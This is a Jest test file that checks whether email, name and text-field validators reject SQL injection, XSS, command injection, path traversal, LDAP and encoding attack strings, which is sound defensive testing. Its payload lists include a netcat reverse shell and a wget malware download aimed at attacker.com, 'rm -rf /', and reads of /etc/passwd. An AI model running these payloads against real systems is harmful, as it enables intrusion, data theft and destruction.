import {
  validateEmail,
  validateName,
  validateTextField,
} from '@/lib/validation/validators';

describe('Security - OWASP Attack Prevention', () => {
  
  // ============= SQL INJECTION PREVENTION =============
  describe('SQL Injection Prevention', () => {
    const sqlInjectionPayloads = [
      "'; DROP TABLE users;--",
      "' OR '1'='1",
      "' OR 1=1--",
      "admin'--",
      "' UNION SELECT * FROM users--",
      "'; DELETE FROM users;--",
      "1' AND '1'='1",
      "\" OR \"\"=\"",
      "'; UPDATE users SET admin=true;--",
      "' HAVING '1'='1",
    ];

    test('should reject email with SQL injection', () => {
      sqlInjectionPayloads.forEach(payload => {
        const result = validateEmail(payload);
        expect(result.isValid).toBe(false);
      });
    });

    test('should reject name with SQL injection', () => {
      sqlInjectionPayloads.forEach(payload => {
        const result = validateName(payload);
        expect(result.isValid).toBe(false);
      });
    });

    test('should reject text field with SQL injection', () => {
      sqlInjectionPayloads.forEach(payload => {
        const result = validateTextField(payload, 'Test', 1, 500);
        expect(result.isValid).toBe(false);
      });
    });
  });

  // ============= XSS (Cross-Site Scripting) PREVENTION =============
  describe('XSS Prevention', () => {
    const xssPayloads = [
      '<script>alert("xss")</script>',
      '<img src=x onerror=alert(1)>',
      '<svg onload=alert(1)>',
      'javascript:alert(1)',
      '<iframe src="javascript:alert(1)">',
      '<body onload=alert(1)>',
      '<input onfocus=alert(1)>',
      '<marquee onstart=alert(1)>',
      '<details open ontoggle=alert(1)>',
      '<embed src="data:text/html,<script>alert(1)</script>">',
      '<img src=x alt=x title=x onerror=alert(1)>',
      '<video><source onerror=alert(1)>',
      '<audio src=x onerror=alert(1)>',
      '<form action=javascript:alert(1)>',
      '"><script>alert(1)</script>',
    ];

    test('should reject name with XSS payload', () => {
      xssPayloads.forEach(payload => {
        const result = validateName(payload);
        expect(result.isValid).toBe(false);
      });
    });

    test('should reject email with XSS payload', () => {
      xssPayloads.forEach(payload => {
        const result = validateEmail(payload);
        expect(result.isValid).toBe(false);
      });
    });

    test('should reject text field with XSS payload', () => {
      xssPayloads.forEach(payload => {
        const result = validateTextField(payload, 'Test', 1, 500);
        expect(result.isValid).toBe(false);
      });
    });
  });

  // ============= COMMAND INJECTION PREVENTION =============
  describe('Command Injection Prevention', () => {
    const commandInjectionPayloads = [
      '; cat /etc/passwd',
      '| cat /etc/passwd',
      '`cat /etc/passwd`',
      '$(cat /etc/passwd)',
      '&& rm -rf /',
      '| whoami',
      '; nc -e /bin/sh attacker.com 4444',
      '$(whoami)',
      '`whoami`',
      '; curl http://attacker.com',
      '| wget http://attacker.com/malware.sh',
    ];

    test('should reject name with command injection', () => {
      commandInjectionPayloads.forEach(payload => {
        const result = validateName(payload);
        expect(result.isValid).toBe(false);
      });
    });

    test('should reject text field with command injection', () => {
      commandInjectionPayloads.forEach(payload => {
        const result = validateTextField(payload, 'Test', 1, 500);
        expect(result.isValid).toBe(false);
      });
    });
  });

  // ============= PATH TRAVERSAL PREVENTION =============
  describe('Path Traversal Prevention', () => {
    const pathTraversalPayloads = [
      '../../../etc/passwd',
      '..\\..\\windows\\system32',
      '....//....//....//etc/passwd',
      '..%2f..%2f..%2fetc%2fpasswd',
      '...%252f...%252f...%252fetc%252fpasswd',
      '/etc/passwd',
      'C:\\windows\\system32',
      '//etc//passwd',
      '\\\\server\\share',
    ];

    test('should reject name with path traversal', () => {
      pathTraversalPayloads.forEach(payload => {
        const result = validateName(payload);
        expect(result.isValid).toBe(false);
      });
    });

    test('should reject text field with path traversal', () => {
      pathTraversalPayloads.forEach(payload => {
        const result = validateTextField(payload, 'Test', 1, 500);
        expect(result.isValid).toBe(false);
      });
    });
  });

  // ============= LDAP INJECTION PREVENTION =============
  describe('LDAP Injection Prevention', () => {
    const ldapInjectionPayloads = [
      '*',
      'admin*',
      '*)(uid=*',
      'admin)(|(uid=*',
      'admin*))(|(&',
    ];

    test('should reject email with LDAP injection', () => {
      ldapInjectionPayloads.forEach(payload => {
        const result = validateEmail(payload + '@example.com');
        expect(result.isValid).toBe(false);
      });
    });
  });

  // ============= BUFFER OVERFLOW / OVERFLOW PREVENTION =============
  describe('Buffer Overflow Prevention', () => {
    test('should reject extremely long strings', () => {
      const veryLongString = 'A'.repeat(10000);
      
      const result = validateTextField(veryLongString, 'Test', 1, 500);
      expect(result.isValid).toBe(false);
    });

    test('should reject name exceeding max length', () => {
      const tooLongName = 'A'.repeat(101);
      
      const result = validateName(tooLongName);
      expect(result.isValid).toBe(false);
      expect(result.error).toContain('not exceed 100');
    });

    test('should enforce max email length', () => {
      const tooLongEmail = 'a'.repeat(255) + '@example.com';
      
      const result = validateEmail(tooLongEmail);
      expect(result.isValid).toBe(false);
    });
  });

  // ============= UNICODE / ENCODING ATTACKS =============
  describe('Unicode and Encoding Attack Prevention', () => {
    test('should handle Unicode escapes safely', () => {
      const unicodePayloads = [
        '\\u0027 OR \\u00271\\u0027=\\u00271',
        '\\u003cscript\\u003e',
        '\\u002e\\u002e/\\u002e\\u002e/etc/passwd',
      ];
      
      unicodePayloads.forEach(payload => {
        const result = validateTextField(payload, 'Test', 1, 500);
        // Should either reject or handle safely (not crash)
        expect(result).toBeDefined();
      });
    });

    test('should handle null byte injection', () => {
      const nullBytePayloads = [
        'Test\0Name',
        'admin\0.pdf',
        'file.txt\0.exe',
      ];
      
      nullBytePayloads.forEach(payload => {
        const result = validateName(payload);
        expect(result.isValid).toBe(false);
      });
    });

    test('should handle double encoding', () => {
      const doubleEncodedPayloads = [
        '%2527 OR %27',
        '%3Cscript%3E',
        '%252e%252e/etc/passwd',
      ];
      
      doubleEncodedPayloads.forEach(payload => {
        const result = validateTextField(payload, 'Test', 1, 500);
        // Should handle safely
        expect(result).toBeDefined();
      });
    });

    test('should handle HTML entities', () => {
      const htmlEntityPayloads = [
        '&lt;script&gt;',
        '&quot;onclick=alert(1)&quot;',
        '&#x3C;img src=x&#x3E;',
      ];
      
      htmlEntityPayloads.forEach(payload => {
        const result = validateTextField(payload, 'Test', 1, 500);
        // Might be rejected or safely encoded
        expect(result).toBeDefined();
      });
    });
  });

  // ============= TYPE COERCION ATTACKS =============
  describe('Type Coercion Prevention', () => {
    test('should handle numeric strings safely', () => {
      // Even though email accepts numbers, format should be validated
      const result = validateEmail('123456789@example.com');
      expect(result.isValid).toBe(true); // Valid format
    });

    test('should not accept boolean as string', () => {
      const result = validateName('true');
      expect(result.isValid).toBe(false); // Too short
    });

    test('should handle null/undefined gracefully', () => {
      const result1 = validateName(null as any);
      const result2 = validateName(undefined as any);
      
      expect(result1.isValid).toBe(false);
      expect(result2.isValid).toBe(false);
    });
  });

  // ============= COMBINED ATTACK VECTORS =============
  describe('Combined Attack Vectors', () => {
    test('should handle SQL + XSS combination', () => {
      const combinedPayload = "'; <script>alert(1)</script>--";
      
      const result1 = validateEmail(combinedPayload);
      const result2 = validateName(combinedPayload);
      
      expect(result1.isValid).toBe(false);
      expect(result2.isValid).toBe(false);
    });

    test('should handle encoding + injection combination', () => {
      const encodedPayload = '%27%20OR%20%271%27%3D%271';
      
      const result = validateTextField(encodedPayload, 'Test', 1, 500);
      expect(result.isValid).toBe(false);
    });

    test('should handle polyglot attack', () => {
      const polyglotPayload = "\"><script>alert('xss')</script><svg onload=fetch('http://attacker.com')>";
      
      const result = validateName(polyglotPayload);
      expect(result.isValid).toBe(false);
    });
  });

});